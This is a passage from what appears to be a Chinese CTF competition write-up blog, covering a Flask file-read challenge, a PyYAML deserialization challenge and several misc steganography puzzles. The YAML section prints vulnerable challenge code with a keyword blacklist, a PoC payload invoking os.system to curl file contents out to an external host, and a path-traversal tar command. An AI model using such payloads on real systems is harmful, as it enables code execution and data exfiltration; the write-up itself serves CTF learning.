class="hljs-keyword">if</span> start==<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">and</span> end==<span class="hljs-string">&quot;0&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>        <span class="hljs-keyword">else</span>:<br>            start,end=<span class="hljs-built_in">int</span>(start),<span class="hljs-built_in">int</span>(end)<br>            f=<span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>)<br>            f.seek(start)<br>            data=f.read(end)<br>            <span class="hljs-keyword">return</span> data<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_page</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-built_in">print</span>(os.path.pardir)<br>    <span class="hljs-built_in">print</span>(path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&quot;templates/&quot;</span> + path):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not found&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> render_template(path)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">False</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br></code></pre></td></tr></table></figure><p>有个任意文件读取，非预期解就直接读环境变量了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-6.png"></p><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    flag = <span class="hljs-literal">True</span><br>    blacklist = [<span class="hljs-string">&#x27;bytes&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;frozenset&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;tuple&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;object&#x27;</span>,<span class="hljs-string">&#x27;listitems&#x27;</span>,<span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;object&#x27;</span>,<span class="hljs-string">&#x27;apply&#x27;</span>]<br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(s).lower():<br>            flag= <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(no)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFile</span>(<span class="hljs-params">filepath, <span class="hljs-built_in">type</span></span>):<br><br>    extractdir = filepath.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractdir):<br>        os.makedirs(extractdir)<br><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;tar&#x27;</span>:<br>        tf = tarfile.TarFile(filepath)<br>        tf.extractall(extractdir)<br>        <span class="hljs-keyword">return</span> tf.getnames()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>        fn = <span class="hljs-string">&#x27;uploads/&#x27;</span> + md5().hexdigest()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fn):<br>            os.makedirs(fn)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        upFile = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(upFile)<br>        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span><br><br>        savePath = <span class="hljs-string">f&quot;uploads/<span class="hljs-subst">&#123;upFile.filename&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(savePath)<br>        upFile.save(savePath)<br><br>        <span class="hljs-keyword">if</span> tarfile.is_tarfile(savePath):<br>            zipDatas = extractFile(savePath, <span class="hljs-string">&#x27;tar&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">if</span> request.args:<br>        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;config/<span class="hljs-subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            Config = yaml.load(f.read())<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, username=<span class="hljs-string">&quot;admin&quot;</span>, message=<span class="hljs-string">&quot;success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>&#x2F;upload路由中上传tar文件，然后通过&#x2F;src路由进行yaml解析，存在PyYAML反序列化漏洞</p><p>poc</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/apply:os.system</span> [<span class="hljs-string">&quot;curl http://ip:7777/?flag=`cat /fl*|base64`&quot;</span>]<br></code></pre></td></tr></table></figure><p>制作tar包<br><code>tar cPvf test.tar ../../config/config.yaml</code></p><p>上传后访问<code>/src?username=config</code>触发</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-7.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ai和nia的交响曲"><a href="#ai和nia的交响曲" class="headerlink" title="ai和nia的交响曲"></a>ai和nia的交响曲</h2><p>upload.php中上传了一个flag1.png</p><p>其中每条黑线到下条黑线恰好8bit，把黑色当成0，白色当成1，竖着读取后转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>)<br>width, height = img.size<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        pixel = img.getpixel((i, j))[<span class="hljs-number">0</span>]<br>        flag += <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">if</span> pixel &gt;= <span class="hljs-number">30</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;0&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;outs.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(flag)<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">8</span>):<br>    byte = flag[i:i+<span class="hljs-number">8</span>]<br>    decimal = <span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>)<br>    result += <span class="hljs-built_in">chr</span>(decimal)<br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>结尾得到<code>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</code></p><p>http流中还有一个flag2.zip，发现是伪加密</p><p>解压后的内容如下，其中还有0宽，但没什么用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">04</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">22</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">04</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">22</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">10</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">13</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">09</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p>在hint中给的视频地址去找字母，得到<code>CAOCAOGAIFAN</code></p><p>组合后为flag：<code>@i_n1a_l0v3S_CAOCAOGAIFAN</code></p><h2 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h2><p>高度不对，先爆破出正确的宽高</p><p>发现两个iend，猜测是snipping的CVE</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-1.png"></p><h2 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h2><p>osfmount挂载，有三个盘</p><p>分别拿到<code>encrypt</code>，<code>normal_rar.rar</code>，<code>not_real_cat.jpg</code></p><p>其中rar可以分离出一张jpg，大小样式与另一张jpg一样，使用双图盲水印</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-2.png"></p><p>使用<code>veracrypt</code>挂载<code>encrypt</code>，密码为<code>watermark_is_fun</code></p><p>拿到<code>KBAUYVCSKR5XK5TYM5SGC3LMNJXWY4BQPBPXSYLVL54TCZLCL5UHUM27NUYTI4JBEEQX2===‌‍</code></p><p>存在零宽隐写，解密后得到<code>Matryoshka</code></p><p>base32后猜测是维吉尼亚</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-3.png"></p><h2 id="程序猿Quby"><a href="#程序猿Quby" class="headerlink" title="程序猿Quby"></a>程序猿Quby</h2><p>QUBY.png可以分离出一个带密码的rar</p><p>图片本身的信息是夏多密码，根据码表转换得到<code>HAVEANICEDAY</code></p><p>注意1，6，12分别表示顺时针旋转180°，90°，0°</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-4.png"></p><p>然后对图片解cloacked-pixel</p><p><code>python2 lsb.py extract QUBY.png out.txt HAVEANICEDAY</code></p><p>得到压缩包密码<code>we1c0met0ycbCTF!!!</code>，解压得到一段wav和两张xlsx表</p><p>xlsx表中有外源数据被隐藏了，大约是中间50行~1000行的部分被折叠了，展开再改颜色能看到两种不同的数字</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-5.png"></p><p>python提取数字后转换成10，画图后两张图拼在一起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> pandas<br>s=<span class="hljs-number">55</span><br>s1=<span class="hljs-number">60</span><br>e=<span class="hljs-number">1023</span><br>e1=<span class="hljs-number">1028</span><br>l=<span class="hljs-number">0</span><br>r=<span class="hljs-number">63</span><br><br><br>img1=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">1050</span>,<span class="hljs-number">140</span>))<br><br>x1=pandas.read_excel(<span class="hljs-string">&quot;1.xlsx&quot;</span>)<br>x1values=x1.values<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s-<span class="hljs-number">2</span>,e-<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r):<br>        <span class="hljs-keyword">if</span> x1values[i][j]&gt;=<span class="hljs-number">5</span>:<br>            img1.putpixel((i,j),<span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img1.putpixel((i,j),<span class="hljs-number">0</span>)<br><br><br>x2=pandas.read_excel(<span class="hljs-string">&quot;2.xlsx&quot;</span>)<br>x2values=x2.values<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s1-<span class="hljs-number">2</span>,e1-<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r):<br>        <span class="hljs-keyword">if</span> x2values[i][j]&gt;=<span class="hljs-number">5</span>:<br>            img1.putpixel((i-<span class="hljs-number">5</span>,j+<span class="hljs-number">63</span>),<span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img1.putpixel((i-<span class="hljs-number">5</span>,j+<span class="hljs-number">63</span>),<span class="hljs-number">0</span>)<br>img1=img1.transpose(Image.FLIP_LEFT_RIGHT)<br>img1.save(<span class="hljs-string">&#x27;img.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>密码w0wyoudo4goodj0b</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-6.png"></p><p>对于wav的带密码的隐写，猜测是DeepSound</p><p>解密得到<code>flag.txt</code>和<code>fl4g.txt</code></p><p>fl4g.txt中的字符串先base85在base32，得到<code>sQ+3ja02RchXLUFmNSZoYPlr8e/HVqxwfWtd7pnTADK15Evi9kGOMgbuIzyB64CJ</code></p><p>观察发现恰好是64位，从a-z,A-Z,0-9,+,&#x2F;  猜测是base换表，flag.txt中的值作为密文</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-7.png"></p><h2 id="两只老虎"><a href="#两只老虎" class="headerlink" title="两只老虎"></a>两只老虎</h2><p>只给了一张图片，但是发现图片后面的IDAT突然变小了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-8.png"></p><p>所以可以删掉前面所有长65536的IDAT块再删一个34018的IDAT块（参考正常的png图片）</p><p>爆破宽高，得到右边那张图片，发现右边多了一些像素</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-9.png"></p><p>原来的图片是1134x720，变成了1144x720</p><p>红色部分全是(255,0,0)，既然两图类似，就放stegsolve尝试xor，发现很多小像素点不规律分布</p><p>最后发现可以提取每行非黑色像素点的个数去转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;solved.bmp&#x27;</span>)<br>w,h = img.size<br>count = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        pixel = img.getpixel((j,i))<br>        <span class="hljs-keyword">if</span>(pixel != (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)):<br>            tmp += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span>(tmp!=<span class="hljs-number">10</span>):<br>        count.append(tmp-<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(count)<br><br>count = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> count)<br><span class="hljs-built_in">print</span>(count)<br><span class="hljs-comment">#[68, 65, 83, 67, 84, 70, 123, 116, 87, 111, 95, 116, 49, 103, 101, 114, 115, 95, 114, 85, 110, 95, 102, 64, 115, 116, 125]</span><br><span class="hljs-comment">#DASCTF&#123;tWo_t1gers_rUn_f@st&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Easy-VMDK"><a href="#Easy-VMDK" class="headerlink" title="Easy_VMDK"></a>Easy_VMDK</h2><blockquote><p>小明这次使用了32Bytes的随机密码，这次总不会被爆破出来了吧！！<br>小明压缩了好了题目后，他发现压缩后大小比压缩前还大啊，这不就没有压缩啊，这是为什么啊！</p></blockquote><p>对压缩包进行明文攻击，本地看下自己的几个vmdk文件头，发现均为<code>4B 44 4D 56 01 00 00 00 03 00 00 00</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-10.png"></p><p>拿到一个<code>flag.zip</code>和<code>key.txt</code></p><p>flag.zip分离出一个带密码的压缩包和一个py脚本，其中是key.txt的加密过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br><br>img = cv2.imread(<span class="hljs-string">&quot;key.png&quot;</span>)<br>r, c = img.shape[:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(r, c)<br><span class="hljs-comment"># 137 2494</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            uu_byte = binascii.a2b_uu(<span class="hljs-string">&#x27;, &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">str</span>(x), img[y, x])) + <span class="hljs-string">&quot;\n&quot;</span>)<br>            f.write(base64.b64encode(uu_byte).decode() + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>解密过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 读取 key.txt 文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br><span class="hljs-comment"># 创建空白图像</span><br>img = np.zeros((<span class="hljs-number">137</span>, <span class="hljs-number">2494</span>), dtype=np.uint8)<br><br><span class="hljs-comment"># 还原图像像素值</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">137</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2494</span>):<br>        <span class="hljs-comment"># 解码 base64 数据</span><br>        encoded_data = lines[y * <span class="hljs-number">2494</span> + x].strip()<br>        decoded_data = base64.b85decode(encoded_data.encode())<br><br>        <span class="hljs-comment"># 获取像素值</span><br>        pixel_value = <span class="hljs-built_in">int</span>.from_bytes(decoded_data, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>) % <span class="hljs-number">256</span><br><br>        <span class="hljs-comment"># 设置图像像素</span><br>        img[y, x] = pixel_value<br><br><span class="hljs-comment"># 保存还原后的图像</span><br>cv2.imwrite(<span class="hljs-string">&quot;restored_key.png&quot;</span>, img)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-11.png"></p><p>用这个密码去解压，得到flag</p><h2 id="GIFuck"><a href="#GIFuck" class="headerlink" title="GIFuck"></a>GIFuck</h2><p>根据帧长切割，利用ocr进行批量识别</p><p><code>++++[-&gt;++++&lt;]&gt;[-&gt;++++++&lt;]&gt;-[-&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]+++&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+